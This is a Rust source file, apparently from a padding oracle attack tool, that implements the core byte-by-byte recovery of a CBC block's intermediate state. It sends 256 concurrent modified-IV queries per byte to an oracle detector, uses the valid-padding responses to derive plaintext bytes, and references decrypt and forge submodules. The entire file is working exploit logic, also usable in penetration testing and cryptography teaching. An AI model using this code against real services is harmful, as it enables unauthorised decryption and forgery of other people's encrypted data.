use std::sync::{
    Arc,
    atomic::{AtomicBool, Ordering},
};

use tokio::{
    spawn,
    sync::{
        Mutex,
        mpsc::{self, Sender},
    },
    task::{JoinHandle, JoinSet},
};

use crate::{
    crypt::detector::{DETECT, Detector},
    errors::DecryptError,
    helper::Messages,
};

pub mod decrypt;
pub mod detector;
pub mod forge;

struct MessageForwarder {
    join_handle: JoinHandle<()>,
    local_tx: Sender<Messages>,
}

impl Drop for MessageForwarder {
    fn drop(&mut self) {
        self.join_handle.abort();
    }
}

impl MessageForwarder {
    fn new(tx: Sender<Messages>, msg_op: Box<dyn Fn(Messages) -> Messages + Send>) -> Self {
        let (local_tx, mut local_rx) = mpsc::channel::<Messages>(255);
        let join_handle = spawn(async move {
            loop {
                match local_rx.recv().await {
                    None => break,
                    Some(msg) => {
                        let _ = tx.send(msg_op(msg)).await;
                    }
                }
            }
        });
        Self {
            join_handle,
            local_tx,
        }
    }
}

async fn calc_intermediate_vector<D: Detector + Send + Sync + 'static>(
    iv: &[u8],
    ct_block: &[u8],
    detector: Arc<D>,
    tx: Sender<Messages>,
) -> Result<Vec<u8>, DecryptError> {
    let mut iv = Vec::from(iv);
    let blk_size = iv.len();
    let intermediate_vector_shared = Arc::new(Mutex::new(vec![0u8; blk_size as usize]));
    let mut curr_padding = 1u8;
    let detector_shared = Arc::new(detector);
    for i in (0..blk_size).rev() {
        let mut futures_set = JoinSet::new();
        let canceled_shared = Arc::new(AtomicBool::new(false));
        for j in 0..=255 {
            let intermediate_vector = intermediate_vector_shared.clone();
            let mut iv_copy = iv.clone();
            let ct_block = ct_block.to_vec();
            let detector = detector_shared.clone();
            let canceled = canceled_shared.clone();
            let tx = tx.clone();
            futures_set.spawn(async move {
                // mark if we're actually updating this byte
                let changed_byte = iv_copy[i as usize] != j;
                iv_copy[i as usize] = j;
                if !canceled.load(Ordering::SeqCst)
                    && let Ok(response) = detector
                        .check(
                            &iv_copy
                                .iter()
                                .chain(&ct_block)
                                .cloned()
                                .collect::<Vec<u8>>(),
                        )
                        .await
                {
                    // found a valid padding
                    if response == DETECT::OUTLIER {
                        // ensures we don't write to the intermediate vector after all requests are canceled
                        let mut intermediate_vector = intermediate_vector.lock().await;
                        if !canceled.load(Ordering::SeqCst) {
                            let zero_byte = j ^ curr_padding;
                            let _ = tx.send(Messages::ByteFound(zero_byte, i)).await;
                            intermediate_vector[i as usize] = zero_byte;
                            if changed_byte {
                                // we want to prioritize valid paddings where a byte was changed, since if the byte wasn't changed
                                // then the tool might think it's written a padding of \x01 when really if wrote \x02 and the plaintext just happened to end with \x02\x02
                                canceled.fetch_or(true, Ordering::SeqCst);
                            }
                        }
                    }
                }
            });
        }
        futures_set.join_all().await;
        if !canceled_shared.load(Ordering::SeqCst) {
            return Err(DecryptError::CouldNotDecryptClassic(
                "Could not find valid padding".to_string(),
            ));
        }
        // if we're not on the last byte then we need to set the cipher text
        // such that the decrypter will see a valid padding \x04\x04\x04... except
        // for the byte that we're working on.
        if i != 0 {
            for k in (blk_size - curr_padding as usize - 1)..blk_size {
                let zero = intermediate_vector_shared.clone().lock().await[k as usize];
                iv[k as usize] = zero ^ curr_padding + 1;
            }
        }
        curr_padding += 1;
    }
    return Ok(intermediate_vector_shared.clone().lock().await.to_vec());
}
